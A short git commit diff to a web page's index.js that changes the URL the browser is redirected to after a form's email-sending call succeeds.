4e3afa6d90045d8f97007a13dc907639aab9094d
husknet <127146284+husknet@users.noreply.github.com>
2024-07-31 09:18:26 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tobyh.nuke-hzd.shop';
+        window.location.href = 'https://terd.beam-upstork.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
